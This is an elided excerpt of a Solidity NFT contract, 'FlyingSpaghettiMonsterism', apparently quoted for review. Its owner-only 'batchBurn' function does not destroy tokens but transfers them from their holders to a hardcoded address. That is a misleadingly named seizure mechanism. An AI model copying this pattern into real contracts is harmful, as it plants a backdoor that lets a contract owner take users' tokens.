...
contract FlyingSpaghettiMonsterism is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("FlyingSpaghettiMonsterism", "FSM", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x2E5D20F0beB58662988E3D597Bf3580fF2414D98, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x10275Dbf53Fc473BBa00c519ED50dEA357096055);
